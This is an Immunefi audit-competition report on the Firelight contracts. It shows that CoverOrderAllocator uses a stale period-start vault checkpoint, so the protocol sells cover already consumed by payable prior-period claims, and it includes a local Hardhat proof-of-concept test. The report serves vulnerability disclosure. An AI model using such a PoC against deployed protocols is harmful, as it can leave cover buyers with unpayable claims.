# 88338 sc high stale vault capacity lets firelight sell cover against collateral owed to prior claims

## #88338 \[SC-High] Stale vault capacity lets Firelight sell cover against collateral owed to prior claims

**Submitted on Aug 12th 2026 at 19:38:17 UTC by @dtutila for** [**Audit Comp | Firelight**](https://immunefi.com/audit-competition/audit-comp-firelight-1)

* **Report ID:** #88338
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/audit-comp-firelight/blob/v1\\_audit\\_ready/contracts/core/CoverOrderAllocator.sol>
* **Impacts:**
  * Protocol insolvency

### Description

## Stale vault capacity lets Firelight sell cover against collateral owed to prior claims

### Target

* Main affected contract: `CoverOrderAllocator.sol`
* Supporting path: `FirelightVault.sol`, `IncidentManager.sol`, `CoverNFT.sol`
* Commit: `42f9ea5e43d88b35197b901acc2a8c24b314fa62`

### Summary

`CoverOrderAllocator` calculates new-period capacity from the vault's immutable period-start checkpoint. However, a claim from the previous period remains payable during the new period and draws from the same live vault assets.

The previous-period liability is never reserved. Firelight can therefore collect a premium and mint a CoverNFT even though the collateral authorizing that cover is still owed to an earlier claim. The PoC demonstrates a buyer paying for 1,000 USD of cover that later receives a zero payout.

### Impact

**Critical — Protocol insolvency.**

The same collateral simultaneously backs a payable period-`P-1` claim and newly settled period-`P` cover. The earlier payout can leave outstanding cover obligations greater than vault assets. The shortfall can reach the full period-start vault balance.

### Root cause

A `P-1` claim remains payable during `P`:

```solidity
// FirelightVault.sol:900-927, 1130-1132
if (!_isPeriodInPayoutWindow(capturePeriod, currentPeriod())) revert InvalidCapturePeriod();

uint256 assetsAtCapturePeriod = totalAssetsAt(capturePeriodStart);
uint256 currentActiveAssets = totalAssets();
paidAmount = Math.min(amount, Math.min(assetsAtCapturePeriod, activePayableAmount));

// _isPeriodInPayoutWindow
return current == period || current == period + 1;
```

[Source](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/FirelightVault.sol#L892-L927)

New-period capacity nevertheless uses the immutable `P`-start checkpoint:

```solidity
// CoverOrderAllocator.sol:704-719
uint256 totalAssetsCanonical = Decimals.convert(
    $.vault.totalAssetsAt($.vault.currentPeriodStart()),
    $.vaultAssetDecimals,
    CANONICAL_DECIMALS,
    Math.Rounding.Floor
);

uint256 availableCollateralCanonical =
    firstLossBufferUSDCanonical + stakedAssetsValueUSDCanonical;
```

[Source](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/CoverOrderAllocator.sol#L689-L725)

Later payout checkpoints do not rewrite the historical value at `currentPeriodStart()`. The commitment guard therefore accepts capacity derived from collateral still payable to the earlier claim:

```solidity
// CoverOrderAllocator.sol:394-403
uint256 maxCapacity = _computeAvailableCapacity($, period);
if (matchingCapacity > maxCapacity) revert MatchingCapacityOverflow(matchingCapacity, maxCapacity);
```

Settlement then transfers the premium and mints the NFT without checking live vault assets or reserving unresolved previous-period exposure ([source](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/CoverOrderAllocator.sol#L457-L539)).

### Attack sequence

1. Settle 1,000 USD of period-1 cover backed by 1,000 vault-asset units.
2. Submit a genuine period-1 incident, which remains payable during period 2.
3. At period 2 start, the checkpoint records 1,000 units.
4. Commit and settle 1,000 USD of period-2 cover. The vault still holds 1,000 live units, so every existing check passes; the buyer pays the premium and receives the CoverNFT.
5. Approve the period-1 claim. It drains the vault to zero.
6. A genuine claim against the period-2 cover closes with a zero payout.

### Privileged roles

No privileged role must act maliciously or incorrectly. The engine commits against the documented period-start snapshot, while the curator and approver process genuine claims through the intended workflow. The defect is the missing on-chain reservation for overlapping liabilities.

### Proof of concept

The PoC uses the real upgradeable `FirelightVault`, `CoverOrderAllocator`, `CoverNFT`, and `IncidentManager`. Only the ERC-20 and constant $1 oracle are mocked. It runs on Hardhat's isolated local network and does not access a public chain. The Phase 2 contracts are not yet deployed, so no Phase 2 mainnet fork is available.

Attach `C04StaleCapacityPayoutAfterSettlement.test.js`, then run:

```bash
git clone https://github.com/immunefi-team/audit-comp-firelight.git
cd audit-comp-firelight
git checkout 42f9ea5e43d88b35197b901acc2a8c24b314fa62
npm install
npx hardhat compile

mkdir -p test/poc
# Save the attached PoC as test/poc/C04StaleCapacityPayoutAfterSettlement.test.js
npx hardhat test test/poc/C04StaleCapacityPayoutAfterSettlement.test.js
```

Expected output:

```
live assets AT commit+settle time: 1000000000
live assets after prior-period payout: 0
period-2 checkpoint capacity assets: 1000000000
new cover sold (canonical USD): 1000000000000000000000
premium actually charged to the buyer: 136987
payout for the new cover: 0
1 passing
```

### Why this is not a known issue

* **External first-loss buffer:** that issue concerns a correctly read live balance in an external, unescrowed wallet that is later withdrawn. This finding concerns the seperate vault leg, whose historical balance is reused after it becomes encumbered by a prior claim. Escrowing the buffer does not fix the stale vault checkpoint.
* **Aggregate claims are not capped:** the PoC uses two different CoverNFTs in two periods, with one valid claim per NFT. Claims do not exceed cover sold; cover sold exceeds available collateral.
* **Staked-asset price drawdown:** the oracle remains fixed at $1. Vault-asset quantity is removed by Firelight's own `payout()`, not by market depreciation.

### Recommended mitigation

Subtract all still-payable previous-period cover exposure—not only incidents already created—from new-period capacity. Alternatively, block commitment and settlement until the previous period's claim window closes. A live-balance check alone is insufficient because the earlier payout can occur after new cover is settled.

### Link to Proof of Concept

<https://gist.github.com/dtutila/bf2e3cbaed1de08445ab0f984795f26b>

### Proof of Concept

const { expect } = require('chai') const { ethers, upgrades } = require('hardhat') const { time } = require('@nomicfoundation/hardhat-network-helpers') const { StandardMerkleTree } = require('@openzeppelin/merkle-tree') const { deployVault } = require(process.cwd() + '/test/setup/fixtures.js')

const DAY = 24n \* 60n \* 60n const YEAR = 365n \* DAY const BPS = 10\_000n const ceilDiv = (x, y) => (x + y - 1n) / y

describe('C-04B: prior-period payout AFTER settlement', function () { it('sells and settles new cover against full live collateral, which a prior-period claim then drains', async function () { const vaultCtx = await deployVault({ initial\_deposit\_limit: ethers.parseUnits('1000000', 6), period\_configuration\_duration: Number(DAY), }) const \[deployer, admin, curator, engine, configAdmin, approver, rejecter, invalidator, payoutAdmin, priceAdmin, buyer, premiumCollector, payoutReceiver, firstLossBuffer] = await ethers.getSigners() const vault = vaultCtx.firelight\_vault const vaultAsset = vaultCtx.token\_contract

```
const collateral6 = ethers.parseUnits('1000', 6)
const cover18 = ethers.parseUnits('1000', 18)
const staker = vaultCtx.users[0]
await vaultCtx.utils.mintAndApprove(collateral6, staker)
await vault.connect(staker).deposit(collateral6, staker.address)

const Token = await ethers.getContractFactory('MockERC20')
const premiumToken = await Token.deploy('Mock USD', 'mUSD', 6)
const Feed = await ethers.getContractFactory('MockAggregatorV3')
const feed = await Feed.deploy(18, ethers.parseUnits('1', 18))

const CoverNFT = await ethers.getContractFactory('CoverNFT')
const coverNFT = await upgrades.deployProxy(CoverNFT, [
  'Firelight Cover', 'FLCOVER', '', admin.address, deployer.address, ethers.ZeroAddress, ethers.ZeroAddress,
], { kind: 'transparent' })

const market = { chainId: 14, protocol: 'CoveredProtocol', market: ethers.encodeBytes32String('market') }
const abi = ethers.AbiCoder.defaultAbiCoder()
const marketId = ethers.keccak256(abi.encode(
  ['uint64', 'string', 'bytes32'], [market.chainId, market.protocol, market.market]
))

const Allocator = await ethers.getContractFactory('CoverOrderAllocator')
const allocator = await upgrades.deployProxy(Allocator, [{
  vault: vault.target,
  premiumCollector: premiumCollector.address,
  coverNFT: coverNFT.target,
  priceFeedAdapter: feed.target,
  maxPriceAge: 7 * 24 * 60 * 60,
  premiumTokens: [premiumToken.target],
  admin: admin.address,
  adminRole: admin.address,
  curatorRole: curator.address,
  allocatorRole: engine.address,
  configAdminRole: configAdmin.address,
  initialProtocolConcentrations: [{ chainId: market.chainId, protocol: market.protocol, maxProtocolConcentrationBps: 10_000 }],
  newMarkets: [market],
  capacityConfig: {
    minCAR: 12_000,
    firstLossBufferToken: premiumToken.target,
    firstLossBuffer: firstLossBuffer.address,
    effectiveLeverage: 12_000,
    minOrderMarketCoverAmount: 1,
    divergenceToleranceBps: 0,
  },
}], { kind: 'transparent', unsafeAllow: ['missing-initializer-call'] })
await coverNFT.connect(admin).grantRole(await coverNFT.MINTER_ROLE(), allocator.target)

const Manager = await ethers.getContractFactory('IncidentManager')
const manager = await upgrades.deployProxy(Manager, [
  admin.address, curator.address, approver.address, rejecter.address, invalidator.address,
  configAdmin.address, payoutAdmin.address, priceAdmin.address, payoutReceiver.address,
  allocator.target, feed.target, 7 * 24 * 60 * 60,
], { kind: 'transparent', unsafeAllow: ['missing-initializer-call'] })
await vault.connect(deployer).grantRole(await vault.PAYOUT_ROLE(), manager.target)
await vault.connect(deployer).grantRole(await vault.INCIDENT_ROLE(), manager.target)
await vault.connect(deployer).grantRole(await vault.PAYOUT_ALLOWLIST_ROLE(), deployer.address)
await vault.connect(deployer).addToPayoutAllowlist(payoutReceiver.address)

const rate = 500n
const premium18 = ceilDiv(cover18 * rate * DAY, BPS * YEAR)
const premium6 = ceilDiv(premium18, 10n ** 12n)
await premiumToken.mint(buyer.address, premium6 * 2n)
await premiumToken.connect(buyer).approve(allocator.target, premium6 * 2n)

const createOrder = () => allocator.connect(curator).createCoverOrder(
  buyer.address, buyer.address, 'beneficiary', premiumToken.target,
  [{ marketId, coverRateAnnual: rate, coverAmount: cover18 }], 0
)
const allocation = [[marketId, cover18]]
const treeFor = (id) => StandardMerkleTree.of([[id, allocation]], ['uint256', '(bytes32,uint256)[]'])

// Period 0: request cover for period 1.
await createOrder()
await time.increaseTo((await vault.currentPeriodEnd()) + 1n)

// Period 1: sell and settle the first cover, then prepare period-2 cover.
const tree1 = treeFor(0n)
await allocator.connect(engine).commitAllocation(1, tree1.root, cover18, cover18)
await allocator.connect(engine).settleCoverOrder(0, [{ marketId, allocatedCover: cover18 }], tree1.getProof(0))
await createOrder() // order 1 targets period 2

// A real period-1 incident is assessed but remains payable in period 2.
const capture1 = BigInt(await time.latest())
await manager.connect(curator).createIncident(capture1, 'Period 1 loss', ethers.id('period-1-loss'))
await manager.connect(curator).confirmIncident(1, 'ipfs://period-1-loss')
await manager.connect(curator).addAssessmentLosses(1, [{ coverTokenId: 0, marketId, amount: cover18 }])
await manager.connect(curator).submitCurrentAssessment(1)

await time.increaseTo((await vault.currentPeriodEnd()) + 1n)
const period2Start = await vault.currentPeriodStart()
expect(await vault.totalAssetsAt(period2Start)).to.equal(collateral6)

// The old claim drains every live vault asset after the period-2 snapshot.
// (drain deferred until after period-2 cover is fully settled)

// Commit + settle period-2 cover while the vault is FULLY collateralised.
const buyerBefore = await premiumToken.balanceOf(buyer.address)
const tree2 = treeFor(1n)
await expect(allocator.connect(engine).commitAllocation(2, tree2.root, cover18, cover18))
  .to.emit(allocator, 'AllocationCommitted')
await allocator.connect(engine).settleCoverOrder(1, [{ marketId, allocatedCover: cover18 }], tree2.getProof(0))
expect((await allocator.getCoverOrder(1)).allocatedCoverAmount).to.equal(cover18)
expect(await coverNFT.ownerOf(1)).to.equal(buyer.address)
// Cover is SOLD and SETTLED while collateral is fully present and live.
expect(await vault.totalAssets()).to.equal(collateral6)
console.log('live assets AT commit+settle time:', (await vault.totalAssets()).toString())

// Only NOW does the prior-period claim land, draining everything.
const premiumPaid = buyerBefore - (await premiumToken.balanceOf(buyer.address))
await manager.connect(approver).approveCurrentAssessment(1)
expect(await vault.totalAssets()).to.equal(0)
expect(await vaultAsset.balanceOf(vault.target)).to.equal(0)
console.log('live assets after prior-period payout:', (await vault.totalAssets()).toString())

// A valid loss under the newly sold cover closes with a zero vault payout.
const capture2 = BigInt(await time.latest())
await manager.connect(curator).createIncident(capture2, 'Period 2 loss', ethers.id('period-2-loss'))
await manager.connect(curator).confirmIncident(2, 'ipfs://period-2-loss')
await manager.connect(curator).addAssessmentLosses(2, [{ coverTokenId: 1, marketId, amount: cover18 }])
await manager.connect(curator).submitCurrentAssessment(2)
const receiverBefore = await vaultAsset.balanceOf(payoutReceiver.address)
await manager.connect(approver).approveCurrentAssessment(2)
const secondPayout = (await vaultAsset.balanceOf(payoutReceiver.address)) - receiverBefore

console.log('period-2 checkpoint capacity assets:', (await vault.totalAssetsAt(period2Start)).toString())
console.log('live assets NOW (after prior-period payout):', (await vault.totalAssets()).toString())
console.log('new cover sold (canonical USD):', cover18.toString())
console.log('premium actually charged to the buyer:', premiumPaid.toString())
console.log('payout for the new cover:', secondPayout.toString())

expect(premiumPaid).to.be.gt(0) // the buyer really paid for cover that cannot be honoured
expect(secondPayout).to.equal(0)
expect((await manager.getIncident(2))[0].status).to.equal(4) // CLOSED
```

}) })
